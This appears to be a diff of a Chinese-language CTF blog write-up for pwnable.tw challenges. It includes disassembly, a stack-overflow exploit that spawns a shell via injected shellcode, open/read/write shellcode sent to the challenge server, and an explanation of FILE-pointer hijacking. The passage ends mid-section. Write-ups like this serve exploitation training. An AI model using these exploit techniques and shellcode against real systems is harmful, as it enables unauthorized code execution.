@@ -1,486 +1,284 @@
 <!DOCTYPE html>
+<html lang="zh-Hans">
 
 
 
 
 
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-Hans">
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
-
-<link rel="stylesheet" href="/css/main.css?v=7.1.0">
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.0">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.0">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">
-
-
-
-
-
-
-
-<script id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '7.1.0',
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
-    back2top: true,
-    back2top_sidebar: false,
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+  <meta name="description" content="zs0zrc&#39;s blog">
+  <meta name="author" content="zs0zrc">
+  <meta name="keywords" content="pwn CTF security anythings">
+  <title>pwnable.tw writeup - zs0zrc</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
 
 
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
 
 
-  <meta name="description" content="start  防护机制： 12345670 % checksec start [*] &amp;apos;/home/zs0zrc/pwn/pwnable.tw/start/start&amp;apos;    Arch:     i386-32-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX disabled">
-<meta name="keywords" content="pwn,pwnable.tw">
-<meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.tw writeup">
-<meta property="og:url" content="http://yoursite.com/2018/10/07/2018-10-7-pwnable.tw-writeup/index.html">
-<meta property="og:site_name" content="zs0zrc">
-<meta property="og:description" content="start  防护机制： 12345670 % checksec start [*] &amp;apos;/home/zs0zrc/pwn/pwnable.tw/start/start&amp;apos;    Arch:     i386-32-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX disabled">
-<meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/picture/1554784102423.png">
-<meta property="og:image" content="http://yoursite.com/picture/1554784120464.png">
-<meta property="og:image" content="http://yoursite.com/picture/1554784263911.png">
-<meta property="og:updated_time" content="2019-04-09T04:42:15.814Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.tw writeup">
-<meta name="twitter:description" content="start  防护机制： 12345670 % checksec start [*] &amp;apos;/home/zs0zrc/pwn/pwnable.tw/start/start&amp;apos;    Arch:     i386-32-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX disabled">
-<meta name="twitter:image" content="http://yoursite.com/picture/1554784102423.png">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
 
 
+<!-- 自定义样式保持在最底部 -->
 
-
-
-  
-  
-  <link rel="canonical" href="http://yoursite.com/2018/10/07/2018-10-7-pwnable.tw-writeup/">
-
-
-
-<script id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
-
-  <title>pwnable.tw writeup | zs0zrc</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-title { opacity: initial; }
-
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
 
 </head>
 
-<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
-  
-  
-    
-  
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>zs0zrc</strong>&nbsp;</a>
 
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">zs0zrc</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-    
-    
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="切换导航栏">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
     </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">Categories</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
   </div>
-</div>
-
-
-
-<nav class="site-nav">
-  
-    <ul id="menu" class="menu">
-      
-        
-        
-        
-          
-          <li class="menu-item menu-item-home">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-about">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-tags">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-categories">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
-
-  </li>
-
-      
-      
-    </ul>
-  
-
-  
-
-  
 </nav>
 
-
-
-  
-
-
-
-</div>
-    </header>
-
-    
-  
-  
-
-  
-
-  <a href="https://github.com/zszcr" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
-
-
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-            
-
-          
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/07/2018-10-7-pwnable.tw-writeup/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="zs0zrc">
-      <meta itemprop="description" content="zs0zrc's blog">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="zs0zrc">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">pwnable.tw writeup
-
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-10-07 10:10:05" itemprop="dateCreated datePublished" datetime="2018-10-07T10:10:05+08:00">2018-10-07</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-04-09 12:42:15" itemprop="dateModified" datetime="2019-04-09T12:42:15+08:00">2019-04-09</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF-s-writeup/" itemprop="url" rel="index"><span itemprop="name">CTF's writeup</span></a></span>
-
-                
-                
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
               
             </span>
-          
 
-          
             
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  Sunday, October 7th 2018, 10:10 am
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    3.9k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      20 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
             
-          
+          </div>
 
           
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
+      </div>
+    </div>
+  </header>
 
+  <main>
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
-      
-        <h3 id="start"><a href="#start" class="headerlink" title="start"></a>start</h3><p>  防护机制：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0 % checksec start </span><br><span class="line">[*] &apos;/home/zs0zrc/pwn/pwnable.tw/start/start&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-<p>  用ida看了下程序，发现只有十几行汇编代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">.text:08048060 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:08048060</span><br><span class="line">.text:08048060</span><br><span class="line">.text:08048060                 public _start</span><br><span class="line">.text:08048060 _start          proc near</span><br><span class="line">.text:08048060                 push    esp</span><br><span class="line">.text:08048061                 push    offset _exit</span><br><span class="line">.text:08048066                 xor     eax, eax</span><br><span class="line">.text:08048068                 xor     ebx, ebx</span><br><span class="line">.text:0804806A                 xor     ecx, ecx</span><br><span class="line">.text:0804806C                 xor     edx, edx</span><br><span class="line">.text:0804806E                 push    &apos;:FTC&apos;</span><br><span class="line">.text:08048073                 push    &apos; eht&apos;</span><br><span class="line">.text:08048078                 push    &apos; tra&apos;</span><br><span class="line">.text:0804807D                 push    &apos;ts s&apos;</span><br><span class="line">.text:08048082                 push    2774654Ch</span><br><span class="line">.text:08048087                 mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089                 mov     dl, 14h         ; len</span><br><span class="line">.text:0804808B                 mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D                 mov     al, 4</span><br><span class="line">.text:0804808F                 int     80h             ; LINUX - sys_write</span><br><span class="line">.text:08048091                 xor     ebx, ebx</span><br><span class="line">.text:08048093                 mov     dl, 3Ch</span><br><span class="line">.text:08048095                 mov     al, 3</span><br><span class="line">.text:08048097                 int     80h             ; LINUX -</span><br><span class="line">.text:08048099                 add     esp, 14h</span><br><span class="line">.text:0804809C                 retn</span><br><span class="line">.text:0804809C _start          endp ; sp-analysis failed</span><br><span class="line">.text:0804809C</span><br><span class="line">.text:0804809D</span><br><span class="line">.text:0804809D ; =============== S U B R O U T I N E =======================================</span><br></pre></td></tr></table></figure>
-<p>  这里实现了wirte 和read的系统调用，在调用read时存在栈溢出。看到防护机制后想到的做法就是 往栈上写shellcode，然后执行shellcode。具体要先泄露stack的地址，然后往栈上写shellcode再覆盖返回地址为shellcode的地址，最后跳转去执行shellcode</p>
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="start"><a href="#start" class="headerlink" title="start"></a>start</h3><p>  防护机制：</p>
+<pre><code>0 % checksec start 
+[*] &#39;/home/zs0zrc/pwn/pwnable.tw/start/start&#39;
+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+</code></pre><p>  用ida看了下程序，发现只有十几行汇编代码</p>
+<pre><code>  .text:08048060 ; =============== S U B R O U T I N E =======================================
+  .text:08048060
+  .text:08048060
+  .text:08048060                 public _start
+  .text:08048060 _start          proc near
+  .text:08048060                 push    esp
+  .text:08048061                 push    offset _exit
+  .text:08048066                 xor     eax, eax
+  .text:08048068                 xor     ebx, ebx
+  .text:0804806A                 xor     ecx, ecx
+  .text:0804806C                 xor     edx, edx
+  .text:0804806E                 push    &#39;:FTC&#39;
+  .text:08048073                 push    &#39; eht&#39;
+  .text:08048078                 push    &#39; tra&#39;
+  .text:0804807D                 push    &#39;ts s&#39;
+  .text:08048082                 push    2774654Ch
+  .text:08048087                 mov     ecx, esp        ; addr
+  .text:08048089                 mov     dl, 14h         ; len
+  .text:0804808B                 mov     bl, 1           ; fd
+  .text:0804808D                 mov     al, 4
+  .text:0804808F                 int     80h             ; LINUX - sys_write
+  .text:08048091                 xor     ebx, ebx
+  .text:08048093                 mov     dl, 3Ch
+  .text:08048095                 mov     al, 3
+  .text:08048097                 int     80h             ; LINUX -
+  .text:08048099                 add     esp, 14h
+  .text:0804809C                 retn
+  .text:0804809C _start          endp ; sp-analysis failed
+  .text:0804809C
+  .text:0804809D
+  .text:0804809D ; =============== S U B R O U T I N E =======================================
+</code></pre><p>  这里实现了wirte 和read的系统调用，在调用read时存在栈溢出。看到防护机制后想到的做法就是 往栈上写shellcode，然后执行shellcode。具体要先泄露stack的地址，然后往栈上写shellcode再覆盖返回地址为shellcode的地址，最后跳转去执行shellcode</p>
 <p>  exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p = remote('chall.pwnable.tw',10000)</span></span><br><span class="line">p = process(<span class="string">'./start'</span>)</span><br><span class="line">shellcode =<span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73"</span>\</span><br><span class="line">                   <span class="string">"\x68\x68\x2f\x62\x69\x6e\x89"</span>\</span><br><span class="line">                   <span class="string">"\xe3\x89\xc1\x89\xc2\xb0\x0b"</span>\</span><br><span class="line">                   <span class="string">"\xcd\x80\x31\xc0\x40\xcd\x80"</span></span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x14</span> + p32(<span class="number">0x08048087</span>)<span class="comment">#write</span></span><br><span class="line">p.send(payload)</span><br><span class="line">leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">stack = leak + <span class="number">0x10</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak_stack --&gt;[%s]"</span>%hex(leak_stack)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">0x14</span>+p32(leak_stack+<span class="number">0x4</span>)+shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">  from pwn import*
+  context.log_level = &#39;debug&#39;
+  #p = remote(&#39;chall.pwnable.tw&#39;,10000)
+  p = process(&#39;./start&#39;)
+  shellcode =&quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;\
+                     &quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;\
+                     &quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;\
+                     &quot;\xcd\x80\x31\xc0\x40\xcd\x80&quot;
+  p.recv()
+  payload = &#39;a&#39;*0x14 + p32(0x08048087)#write
+  p.send(payload)
+  leak = u32(p.recv(4))
+  stack = leak + 0x10
+  print &quot;leak_stack --&gt;[%s]&quot;%hex(leak_stack)
+
+  p.send(&#39;a&#39;*0x14+p32(leak_stack+0x4)+shellcode)
+
+  p.interactive()
+</code></pre>
 <h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h3><p>  这题之前做过类似的 ，就是HITCON-Training-master的lab2</p>
 <p>  这题也是要执行shellcode，不过它限制了可以执行的函数，要求用open read和write 3个函数来读取flag</p>
 <p>  我拿以前的脚本改了下就打通了</p>
 <p>  exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"><span class="comment"># -*-: coding: UTF-8 -*-  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*  </span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p = process('./orw')  </span></span><br><span class="line">p = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10001</span>)</span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">mov eax,0x5 </span></span><br><span class="line"><span class="string">push 0x6761</span></span><br><span class="line"><span class="string">push 0x6c662f77</span></span><br><span class="line"><span class="string">push 0x726f2f65</span></span><br><span class="line"><span class="string">push 0x6d6f682f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">int 0x80 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov eax,0x3 </span></span><br><span class="line"><span class="string">mov ecx,ebx </span></span><br><span class="line"><span class="string">mov ebx,0x3 </span></span><br><span class="line"><span class="string">mov dl,0x30 </span></span><br><span class="line"><span class="string">int 0x80 </span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">mov eax,0x4 </span></span><br><span class="line"><span class="string">mov bl,0x1 </span></span><br><span class="line"><span class="string">int 0x80 </span></span><br><span class="line"><span class="string">'''</span>  </span><br><span class="line">payload = asm(shellcode)  </span><br><span class="line">p.recv() </span><br><span class="line">p.send(payload)  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">  #!/usr/bin/env python  
+  # -*-: coding: UTF-8 -*-  
+  from pwn import*  
+  context.log_level = &#39;debug&#39;
+  #p = process(&#39;./orw&#39;)  
+  p = remote(&#39;chall.pwnable.tw&#39;,10001)
+  shellcode = &#39;&#39;&#39;
+  mov eax,0x5 
+  push 0x6761
+  push 0x6c662f77
+  push 0x726f2f65
+  push 0x6d6f682f
+  mov ebx,esp
+  xor ecx,ecx
+  int 0x80 
+
+  mov eax,0x3 
+  mov ecx,ebx 
+  mov ebx,0x3 
+  mov dl,0x30 
+  int 0x80 
+
+  mov eax,0x4 
+  mov bl,0x1 
+  int 0x80 
+  &#39;&#39;&#39;  
+  payload = asm(shellcode)  
+  p.recv() 
+  p.send(payload)  
+  p.interactive()  
+</code></pre>
 <p>  不过这个我看别人的wp又学到了一种姿势，就是用pwntools的 函数自动生成对应函数的shellcode</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">''</span></span><br><span class="line">shellcode += shellcraft.pushstr(<span class="string">'/home/orw/flag'</span>)<span class="comment">#往栈上压入字符串</span></span><br><span class="line">shellcode += shellcraft.open(<span class="string">'esp'</span>, <span class="number">0</span>, <span class="number">0</span>)<span class="comment">#设置参数</span></span><br><span class="line">shellcode += shellcraft.read(<span class="string">'eax'</span>, <span class="string">'esp'</span>, <span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, <span class="string">'esp'</span>, <span class="number">100</span>)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">  shellcode = &#39;&#39;
+  shellcode += shellcraft.pushstr(&#39;/home/orw/flag&#39;)#往栈上压入字符串
+  shellcode += shellcraft.open(&#39;esp&#39;, 0, 0)#设置参数
+  shellcode += shellcraft.read(&#39;eax&#39;, &#39;esp&#39;, 100)
+  shellcode += shellcraft.write(1, &#39;esp&#39;, 100)
+</code></pre>
 <h3 id="seethefile"><a href="#seethefile" class="headerlink" title="seethefile"></a>seethefile</h3><p>防护机制：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/zs0zrc/pwn/pwnable.tw/seethefile/seethefile&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-<p>程序一共五个功能</p>
+<pre><code>[*] &#39;/home/zs0zrc/pwn/pwnable.tw/seethefile/seethefile&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre><p>程序一共五个功能</p>
 <ol>
 <li>Open : 打开一个文件，但是不能打开flag文件</li>
 <li>Read ： 读取文件的0x18字节的内容</li>
@@ -489,34 +287,296 @@
 <li>Exit ： 读取名字，同时关闭文件流并退出程序</li>
 </ol>
 <p>程序的文件流指针存放在bss段</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0804B</span>280                 <span class="keyword">public</span> fp</span><br><span class="line">.bss:<span class="number">0804B</span>280 ; FILE *fp</span><br><span class="line">.bss:<span class="number">0804B</span>280 fp              dd ?                    ; DATA XREF: openfile+<span class="number">6</span>↑r</span><br><span class="line">.bss:<span class="number">0804B</span>280                                         ; openfile+AD↑w ...</span><br><span class="line">.bss:<span class="number">0804B</span>280 _bss            ends</span><br><span class="line">.bss:<span class="number">0804B</span>280</span><br></pre></td></tr></table></figure>
+<pre><code class="c">.bss:0804B280                 public fp
+.bss:0804B280 ; FILE *fp
+.bss:0804B280 fp              dd ?                    ; DATA XREF: openfile+6↑r
+.bss:0804B280                                         ; openfile+AD↑w ...
+.bss:0804B280 _bss            ends
+.bss:0804B280
+</code></pre>
 <p>name变量在fp变量的上面，同时程序读取name时没限制长度，所以可以覆盖fp指针，通过伪造_IO_FILE_plus结构体，覆盖fp指针指向伪造的结构体，最后通过fclose函数关闭fp来getshell,即劫持fp指针</p>
 <p>不过要先知道libc的地址，libc的地址可以通过读取 /proc/self/maps文件来来得到</p>
 <ul>
 <li><p>泄露libc地址</p>
